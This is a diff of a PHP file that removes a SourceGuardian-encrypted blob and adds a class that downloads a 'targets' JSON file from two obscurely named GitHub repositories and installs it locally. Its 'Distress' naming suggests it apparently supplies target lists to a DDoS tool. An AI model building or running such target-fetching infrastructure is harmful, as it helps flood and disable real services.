@@ -1,2 +1,75 @@
 <?php
-if(!function_exists('sg_load')){$__v=phpversion();$__x=explode('.',$__v);$__v2=$__x[0].'.'.(int)$__x[1];$__u=strtolower(substr(php_uname(),0,3));$__ts=(@constant('PHP_ZTS') || @constant('ZEND_THREAD_SAFE')?'ts':'');$__f=$__f0='ixed.'.$__v2.$__ts.'.'.$__u;$__ff=$__ff0='ixed.'.$__v2.'.'.(int)$__x[2].$__ts.'.'.$__u;$__ed=@ini_get('extension_dir');$__e=$__e0=@realpath($__ed);$__dl=function_exists('dl') && function_exists('file_exists') && @ini_get('enable_dl') && !@ini_get('safe_mode');if($__dl && $__e && version_compare($__v,'5.2.5','<') && function_exists('getcwd') && function_exists('dirname')){$__d=$__d0=getcwd();if(@$__d[1]==':') {$__d=str_replace('\\','/',substr($__d,2));$__e=str_replace('\\','/',substr($__e,2));}$__e.=($__h=str_repeat('/..',substr_count($__e,'/')));$__f='/ixed/'.$__f0;$__ff='/ixed/'.$__ff0;while(!file_exists($__e.$__d.$__ff) && !file_exists($__e.$__d.$__f) && strlen($__d)>1){$__d=dirname($__d);}if(file_exists($__e.$__d.$__ff)) dl($__h.$__d.$__ff); else if(file_exists($__e.$__d.$__f)) dl($__h.$__d.$__f);}if(!function_exists('sg_load') && $__dl && $__e0){if(file_exists($__e0.'/'.$__ff0)) dl($__ff0); else if(file_exists($__e0.'/'.$__f0)) dl($__f0);}if(!function_exists('sg_load')){$__ixedurl='https://www.sourceguardian.com/loaders/download.php?php_v='.urlencode($__v).'&php_ts='.($__ts?'1':'0').'&php_is='.@constant('PHP_INT_SIZE').'&os_s='.urlencode(php_uname('s')).'&os_r='.urlencode(php_uname('r')).'&os_m='.urlencode(php_uname('m'));$__sapi=php_sapi_name();if(!$__e0) $__e0=$__ed;if(function_exists('php_ini_loaded_file')) $__ini=php_ini_loaded_file(); else $__ini='php.ini';if((substr($__sapi,0,3)=='cgi')||($__sapi=='cli')||($__sapi=='embed')){$__msg="\nPHP script '".__FILE__."' is protected by SourceGuardian and requires a SourceGuardian loader '".$__f0."' to be installed.\n\n1) Download the required loader '".$__f0."' from the SourceGuardian site: ".$__ixedurl."\n2) Install the loader to ";if(isset($__d0)){$__msg.=$__d0.DIRECTORY_SEPARATOR.'ixed';}else{$__msg.=$__e0;if(!$__dl){$__msg.="\n3) Edit ".$__ini." and add 'extension=".$__f0."' directive";}}$__msg.="\n\n";}else{$__msg="<html><body>PHP script '".__FILE__."' is protected by <a href=\"https://www.sourceguardian.com/\">SourceGuardian</a> and requires a SourceGuardian loader '".$__f0."' to be installed.<br><br>1) <a href=\"".$__ixedurl."\" target=\"_blank\">Click here</a> to download the required '".$__f0."' loader from the SourceGuardian site<br>2) Install the loader to ";if(isset($__d0)){$__msg.=$__d0.DIRECTORY_SEPARATOR.'ixed';}else{$__msg.=$__e0;if(!$__dl){$__msg.="<br>3) Edit ".$__ini." and add 'extension=".$__f0."' directive<br>4) Restart the web server";}}$__msg.="</body></html>";}die($__msg);exit();}}return sg_load('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');
+
+class DistressGetTargetsFile extends SFunctions {
+
+    private static array $urls = [
+        "https://raw.githubusercontent.com/crayfish-kissable-marrow/crayfish/master/31.json",
+        "https://raw.githubusercontent.com/snoring-huddling-charred/snoring/master/31.json",
+    ];
+
+    private static object $getState,
+                          $getStateClear;
+
+    public static function constructStatic()
+    {
+        static::$getStateClear = (object) [
+            'success' => false,
+            'md5Current' => '',
+            'md5Previous' => '',
+            'path' => '',
+            'changed' => false,
+            'changedAt' => 0,
+        ];
+
+        static::$getState = static::$getStateClear;
+    }
+
+    public static function getDistressTargetsFile(string $localTargetsFilePath): object
+    {
+        $previousGetState = static::$getState;
+        static::$getState = static::$getStateClear;
+        static::$getState->md5Previous = $previousGetState->md5Current;
+        static::$getState->path = $localTargetsFilePath;
+
+        if (file_exists($localTargetsFilePath)) {
+            unlink($localTargetsFilePath);
+        }
+
+        shuffle(static::$urls);
+
+        foreach(static::$urls as $url) {
+            $targets = static::httpGet($url);
+            if (!$targets) {
+                continue;
+            }
+
+            // ---
+
+            static::$getState->success = true;
+
+            file_put_contents_secure($localTargetsFilePath, $targets);
+            chown($localTargetsFilePath, 'app-h');
+            chgrp($localTargetsFilePath, 'app-h');
+
+            static::$getState->md5Current = md5_file($localTargetsFilePath);
+            static::$getState->changed =     static::$getState->md5Previous
+                                             &&  static::$getState->md5Previous !== static::$getState->md5Current;
+
+            if (static::$getState->changed) {
+                static::$getState->changedAt = time();
+            }
+
+            break;
+        }
+
+        return static::$getState;
+    }
+
+    public static function lastGetStateOfDistressTargetsFile(): object
+    {
+        return static::$getState;
+    }
+
+}
+
+DistressGetTargetsFile::constructStatic();
